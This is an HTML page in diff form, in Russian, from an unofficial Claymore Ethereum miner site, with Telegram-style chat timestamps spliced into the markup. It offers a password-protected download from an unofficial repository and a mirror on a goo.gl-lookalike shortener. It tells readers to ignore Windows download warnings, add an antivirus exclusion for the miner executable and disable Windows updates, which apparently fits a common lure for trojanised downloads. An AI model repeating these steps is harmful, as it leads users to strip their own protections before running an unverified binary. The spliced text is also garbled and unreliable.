+  <div class="eth-button down"><i class="far fa-arrow-alt-circle-down"></i>
+  <a href="https://github.com/Claymore-Dual/Claymore-Dual-Miner/releases/download/15.0/Claymore.s.dual.ethereum.v15.0.-.widows.Password-claymore.zip">Скачать сейчас (Windows x64)</a>
+  </div>
+  <span class="eth-mirror">(<a href="https://goo-gl.su/claymore" target="_blank" rel="nofollow">Зеркало</a>)</span>
+  </div> 
+ </div>
+</div>
+</section>
+<section class="eth-art">
+ <div class="eth-vi2">
+<p>Обратите внимание, что при загрузке Claymore Miner Windows может выдать предупреждение, но если вы воспользовались ссылкой для скачивания Claymore, вы можете проигнорировать это.</p>
+<p>После загрузки извлеките папку на рабочий стол для быстрого доступа.</p>
+<h2><a id="sect18"></a>Шаг 7. Настройте некоторые параметры Windows перед майнингом.</h2>
+<p>Некоторые настройки должны быть изменены в Windows, чтобы подготовиться к майнингу:</p>
+<ol>
+ <li>Во-первых, вы не хотите, чтобы ваш компьютер переходил в спящий режим, поскольку это будет прерывать майнинг, поэтому зайдите в настройки электропитания и установите для него значение «Никогда», чтобы отключить  «перевести в спящий режим».</li>
+ <li>Измените файл подкачки и вручную установите его в 16384 МБ (это 16 ГБ). 
+ 
+<p>
+<a href="items/screens/kak_uvelichit_fayl_podkachki_windows.png" target="_blank">
+<img src="items/screens/kak_uvelichit_fayl_podkachki_windows.png" alt="kak_uvelichit_fayl_podkachki_windows"></a>
+</p>
+ </li>
+ <li>Чтобы свести к минимуму сбои в работе майнинга вы можете также <strong>отключить обновления Windows</strong>. Если вы чувствуете себя в большей безопасности, оставив их включенными, вы можете сделать это и просто понять, что есть очень частые обновления, которые иногда <strong>перезагружают</strong> вашу систему без вашего участия и, следовательно, <strong>останавливают</strong> майнинг.</li>
+
+DieKaND, [14.07.2024 20:45]
+<li>Если вы используете Защитник Windows или другую антивирусную программу, добавьте в нее <strong>исключение</strong>, чтобы он не помечал исполняемый файл Claymore mining «EthDcrMiner64.exe» как вирус или пытался отключить / удалить его.</li>
+</ol>
+<h2><a id="sect19"></a>Шаг 8: Присоединитесь к пулу и настройте свой Bat файл</h2>
+<p>Следующим шагом является настройка пула, так как соло майнинг в 2019 году практически не возможен (только если у вас не ангар с видеокартами).</p>
+<p>Первым шагом будет выбор пула майнинга Ethereum. Есть из чего выбирать, но мы рекомендуем <a href="https://eth.nanopool.org/" target="_blank" rel="nofollow">Nanopool</a>, <a href="https://dwarfpool.com/eth" target="_blank" rel="nofollow">Dwarfpool</a> или Ethermine<a href="https://eth.nanopool.org/" target="_blank">. </a>Домашняя страница или раздел справки сайта-пула, скорее всего, содержит инструкции о том, как майнить с помощью популярного майнера Claymore.</p>
+<p class="vaz">Для целей данного руководства мы будем использовать Etheremine. Непосредственно на домашней странице <a href="http://ethermine.org/" target="_blank" rel="nofollow">Ethermine.org</a> вы увидите раздел «Режим Stratum с использованием Claymores Miner». Откройте папку Claymore miner на рабочем столе, щелкните правой кнопкой мыши текстовый файл «Пуск» и выберите «Редактировать».</p>
+<p>Перейдите на сайт Ethermine, выделите и скопируйте весь текст.</p>
+<p>
+<a href="items/start/how/Ethermine-Instructions1.png" target="_blank">
+<img src="items/start/how/Ethermine-Instructions1.png" alt="Ethermine-Instructions1"></a>
+</p>
+<p>В зависимости от вашего местоположения вы хотите подключиться к ближайшему к вам серверу и обновить текстовую строку для сервера:</p>
+<code>eu1.ethermine.org:4444</code>
+<p>Для выбора наиболее подходящего для вас сервера в зависимости от вашего местоположения используйте:</p>
+<blockquote><pre><code>
+Северная Америка (Восток): us1.ethermine.org:4444 или us1.ethermine.org:14444
+
+Северная Америка (Запад): us2.ethermine.org:4444 или us2.ethermine.org:14444
+
+Европа (Франция): eu1.ethermine.org:4444 или eu1.ethermine.org:14444
+
+Европа (Германия): eu2.ethermine.org:4444 или eu2.ethermine.org:14444
+
+Азия: asia1.ethermine.org:4444 или asia1.ethermine.org:14444</code>
+</pre></blockquote>
+
+<p>В этом примере я установил пул для Восточного побережья США, так что теперь внутри вашего текстового файла вы должны иметь:</p>
+<div class="vaz"><pre><code>setx GPU_FORCE_64BIT_PTR 0
+setx GPU_MAX_HEAP_SIZE 100
+setx GPU_USE_SYNC_OBJECTS 1
+setx GPU_MAX_ALLOC_PERCENT 100
+setx GPU_SINGLE_ALLOC_PERCENT 100
+EthDcrMiner64.exe -epool us1.ethermine.org:4444 -ewal <span class="eth-grn">Your_Ethereum_Address</span>.<span class="eth-grn">RigName</span> -epsw x</code></pre></div>
+<ul>
+ <li>Замените <span class="eth-grn">Your_Ethereum_Address</span> на свой адрес кошелька Ethereum (который начинается с 0x…), скопируйте его из другого текстового файла и вставьте его здесь.</li>
+ <li>Замените <span class="eth-grn">RigName</span> на любое имя, которое вы хотели бы создать для своего майнера. Мы будем использовать «MiningRig1» для нашего примера, так что теперь у вас есть:</li>
+</ul>
+
+<div class="vaz"><pre><code>setx GPU_FORCE_64BIT_PTR 0
+setx GPU_MAX_HEAP_SIZE 100
+setx GPU_USE_SYNC_OBJECTS 1
+setx GPU_MAX_ALLOC_PERCENT 100
+setx GPU_SINGLE_ALLOC_PERCENT 100
+EthDcrMiner64.exe -epool us1.ethermine.org:4444 -wal <span class="eth-grn">0x9147460980c93629e775783148591b7d0a0cbf2d.MiningRig1</span> -epsw x</code></pre></div>
+<p>Соблюдайте синтаксическую структуру файла. Не допускаются лишние символы, пробелы, переосы строк там, где их не должно быть.</p>
+<p>Сохраните ваш файл как пакетный файл с расширением bat. Для этого выберите «Файл» -  «Сохранить как», а затем в поле выберите его имя и введите «.bat» после имени. В поле «Тип файла» выберите «Все файлы» и нажмите «Сохранить».</p>
+<p>Поздравляю! Теперь у вас есть готовый пакетный файл! Создайте ярлык для нового Bat файла и отправьте его на рабочий стол. Затем вы можете удалить текстовую версию файла.</p>
+<p>
+<a href="items/start/how/Saving-Bat-File.
+
+DieKaND, [14.07.2024 20:45]
+png" target="_blank">
+<img src="items/start/how/Saving-Bat-File.png" alt="Saving-Bat-File"></a>
+</p>
+<p class="pad how"> <i class="far fa-lightbulb"></i><span>Вы можете скачать программу с настроенными бат файлами под все поддерживаемые монеты и пулы от Клеймор</span></p>
+<p>
+<a href="items/examples/files.png" target="_blank">
+<img src="items/examples/files.png" alt="files-claymore"></a>
+<span class="img-tit nev">Структура файлов со всеми поддерживаемыми монетами и пулами</span>
+</p>
+
+<p class="pad how2"> <i class="fas fa-exclamation-triangle"></i><span>
+Внимание! Не забудьте поменять кошельки на свои!
+</span></p>
+</div>
+</section>
+<section class="eth-down">
+<div class="eth-title whitez1"><a id="download">Начните добывать Ethereum с Claymore's Dual  Miner </a></div>
+<div class="eth-download">
+ <div class="eth-flex"> 
+  <div class="eth-ver"> 
+  Последняя версия - v15.0
+  MD5: 549B215DDF355A633E2A7FD4B81E3CB2 *Claymore's Dual Ethereum  AMD+NVIDIA GPU Miner v15.0 - Windows.zip
+  <span class="nev2">(<a href="https://github.com/Claymore-Dual/Claymore-Dual-Miner/releases/download/15.0/Claymore.s.Dual.Ethereum.AMD+NVIDIA.GPU.Miner.v15.0.-.LINUX.zip">Скачать для Linux</a>)</span> 
+  </div>
+  <div class="eth-get">
+  <span class="eth-password">Пароль: claymore</span>
+  <div class="eth-button down"><i class="far fa-arrow-alt-circle-down"></i>
+  <a href="https://github.com/Claymore-Dual/Claymore-Dual-Miner/releases/download/15.0/Claymore.s.dual.ethereum.v15.0.-.widows.Password-claymore.zip">Скачать сейчас (Windows x64)</a>
+  </div>
+  <span class="eth-mirror">(<a href="https://goo-gl.su/claymore" target="_blank" rel="nofollow">Зеркало</a>)</span>
+  </div> 
+ </div>
+</div>
+</section>
+<section class="eth-art">
+ <div class="eth-vi2">
+<h2><a id="sect20"></a>Шаг 9: Начните получать Ethereum!</h2>
+<p>Дважды щелкните Bat файл, чтобы запустить майнер. </p>
+<p>Майнер запустится, запустит команды setx для установки переменных среды, инициализирует каждую из ваших видеокарт, создаст DAG файл и начнет хэшировать. Дайте ему поработать около 20 секунд, а затем нажмите «s», чтобы отобразить вашу скорость хеширования.</p>
+<p>Чтобы отслеживать свои доходы в пуле, вернитесь на сайт Ethermine.org и вставьте адрес своего кошелька в окно адреса вверху. Нажмите кнопку «Проверить статус»:</p>
+<p>
+<a href="items/start/how/Ethermine-CheckStatus.png" target="_blank">
+<img src="items/start/how/Ethermine-CheckStatus.png" alt="Ethermine-CheckStatus"></a>
+</p>
+<h2><a id="sect21"></a>7. Часто задаваемые вопросы</h2>
+<h3>Могу ли я использовать мой процессор вместо видеокарты?</h3>
+<p>Видеокарты настолько быстрее, чем майнинг на процессоре. Он больше не приносит прибыли и не стоит его использовать. Даже видеокарты начального уровня примерно в 200 раз быстрее, чем процессоры для майнинга.</p>
+<h3>Могу ли я использовать любой адрес ETH кошелька для майнинга?</h3>
+<p>Вы можете использовать любой адрес кошелька ETH для майнинга, но некоторые биржи не разрешают майнинг или не допускают очень маленькие депозиты, поэтому дважды проверяйте сайт, если майнинг идет прямо на адрес биржи. </p>
+<h3>А как насчет сайтов облачного майнинга?</h3>
+<p><strong>99,9%</strong> сайтов облачного майнинга - это схемы Понци.</p>
+<p> Несмотря на то, что некоторые из них существуют уже давно, не было никаких сторонних проверок проданной мощности хеширования, и прибыль, как правило, очень низкая, если вы не продвигаете сильно и не заставляете других присоединяться (еще один красный флаг, связанный с Понци деятельностью). Краткий ответ - <strong>НЕ покупайте облачный майнинг Ethereum</strong> для добычи Эфира.</p>
+<h2><a id="sect25"></a>8. Вывод</h2>
+<p>Мы надеемся, что вы найдете это руководство полезным! Если у вас возникнут какие-либо проблемы или у вас возникнут вопросы, пожалуйста, прокомментируйте в <a href="https://github.com/Claymore-Dual/Claymore-Dual-Miner/issues" target="_blank" rel="nofollow">Issue Claymore Github</a>, и мы постараемся помочь. </p>
+
+DieKaND, [14.07.2024 20:45]
+<p>Обратите внимание, что мы в этой статье не рассматриваем более продвинутые этапы майнинга, такие как разгон и пониженное напряжение, перепрограммирование BIOS, удаленный доступ и мониторинг или Dual майнинг.</p>
+<p> Счастливого Майнинга!</p>
+
+
+<p><p class="vaz2">Проект Claymore представляет самые <strong>последние версии</strong> программного обеспечения (исправляет все ошибки и баги  предыдущих версий)! Поэтому если у Вас <strong>старая</strong> версия, мы настоятельно советуем <strong>скачать</strong> последнюю версию Claymore's по ссылкам ниже, так как с каждым выходом новой версии добыча Эфира становится <strong>выгоднее</strong>!</p>
+</div>
+</section>
+
+<section class="eth-down">
+<div class="eth-title whitez1"><a id="download">Начните добывать Ethereum с Claymore's Dual  Miner </a></div>
+<div class="eth-download">
+ <div class="eth-flex"> 
+  <div class="eth-ver"> 
+  Последняя версия - v15.0
+  MD5: 549B215DDF355A633E2A7FD4B81E3CB2 *Claymore's Dual Ethereum  AMD+NVIDIA GPU Miner v15.0 - Windows.zip
+  <span class="nev2">(<a href="https://github.com/Claymore-Dual/Claymore-Dual-Miner/releases/download/15.0/Claymore.s.Dual.Ethereum.AMD+NVIDIA.GPU.Miner.v15.0.-.LINUX.zip">Скачать для Linux</a>)</span> 
+  </div>
+  <div class="eth-get">
+  <span class="eth-password">Пароль: claymore</span>
+  <div class="eth-button down"><i class="far fa-arrow-alt-circle-down"></i>
+  <a href="https://github.com/Claymore-Dual/Claymore-Dual-Miner/releases/download/15.0/Claymore.s.dual.ethereum.v15.0.-.widows.Password-claymore.zip">Скачать сейчас (Windows x64)</a>
+  </div>
+  <span class="eth-mirror">(<a href="https://goo-gl.su/claymore" target="_blank" rel="nofollow">Зеркало</a>)</span>
+  </div> 
+ </div>
+</div>
+</section>
+
+
+
+
+
+<!-- footer-->
+<section class="eth-foot">
+ <div class="">
+  <div class="eth-flex">
+   <div class="foot-itm community">
+    <p>Сообщество</p>
+    <ul>
+     <li><a href="https://blog.ethereum.org" target="_blank" rel="nofollow"><i class="fas fa-rss"></i> Блог</a>
+     </li>
+     <li><a href="https://github.com/Claymore-Dual/Claymore-Dual-Miner/releases" target="_blank" rel="nofollow"><i class="fab fa-github"></i> GitHub</a>
+     </li>
+     <li><a href="https://www.youtube.com/user/ethereumproject" target="_blank" rel="nofollow"><i class="fab fa-youtube"></i> YouTube</a>
+     </li>
+     <li><a href="https://www.reddit.com/r/ethereum" target="_blank" rel="nofollow"><i class="fab fa-reddit"></i> Reddit</a>
+     </li>
+     <li><a href="https://gitter.im/ethereum/home" target="_blank" rel="nofollow"><i class="fab fa-gitter"></i> Gitter</a>
+     </li>
+    </ul>
+   </div>
+     
+  <div class="foot-itm community">
+   <ul>
+    <li><a href="https://twitter.com/ethereum" target="_blank" rel="nofollow"><i class="fab fa-twitter"></i> Twitter</a>
+    </li>
+    <li><a href="https://ethereum.stackexchange.com" target="_blank" rel="nofollow"><i class="fab fa-stack-exchange"></i> Stack Exchange</a>
+    </li>
+    <li><a href="https://www.facebook.com/ethereumproject" target="_blank" rel="nofollow"><i class="fab fa-facebook"></i> Facebook                </a>
+    </li>
+    <li><a href="https://ethereum.meetup.com" target="_blank" rel="nofollow"><i class="fab fa-meetup"></i> Встречи</a>
+    </li>
+   </ul>
+  </div>
+  
+   <div class="foot-itm developer-resources">
+   <p>Ресурсы для разработчиков</p>
+   <ul>
+    <li>What is Ether? <a href="#FAQ">Read our FAQ</a></li>
+    <li>Browse our source code on <a href="https://github.com/Claymore-Dual/Claymore-Dual-Miner/releases" target="_blank" rel="nofollow">GitHub</a></li>
+    <li>Read the <a href="http://www.ethdocs.org" target="_blank" rel="nofollow">documentation</a>
+  or <a href="https://github.com/ethereum/wiki/wiki" target="_blank" rel="nofollow">wiki</a></li>
+  <li>Learn <a href="https://solidity.readthedocs.io/en/v0.5.14/" target="_blank" rel="nofollow">Solidity</a></li>
+  <li>See the latest <a href="https://ethstats.net" target="_blank" rel="nofollow">data and network stats</a>
+  </li>
+  <li>Download our <a href="https://www.ethereum.org/assets" rel="nofollow">logo assets </a></li>
+
+DieKaND, [14.07.2024 20:45]
+<li>Want to write about Ethereum? <a href="mailto:press@ethereum.org">Press inquiries</a>
+  </li>
+  <li>switch to the <a href="/ru">English language.</a>
+  </li>
+   </ul>
+   </div>
+  </div>
+ </div>
+</section>
+<section class="eth-post-foot clearfix">
+ <div class="eth-vi2">
+  <div class="nev3 eth-left">Note, when downloading the Claymore Miner, Windows may issue a warning, but if you used Claymore Dual Miner download link you can ignore this.
+  </div>
+
+  <div class="nev3 eth-right">Disclaimer: This isn't an official Claymores site.  No binary files were affected.
+
+  All rights belong to their respective owners. © 2022-2024
+  </div>
+ </div>
+ <a href="https://claymoredualminer.com/cookie" class="eth-policy" target="_blank" rel="nofollow">Cookie Policy</a>
+</section>
+  </div>
+</div>  </body>
+</html>
